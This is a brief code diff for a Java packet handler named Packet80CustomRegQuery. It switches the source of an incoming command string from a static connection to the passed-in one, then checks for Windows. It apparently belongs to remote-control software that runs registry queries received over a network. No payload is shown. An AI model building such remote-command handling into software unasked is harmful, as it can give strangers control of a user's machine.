@@ -8,7 +8,7 @@ public class Packet80CustomRegQuery extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
-		String cmd = Connection.instance.readLine();
+		String cmd = con.readLine();
 		
 		try {
 			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
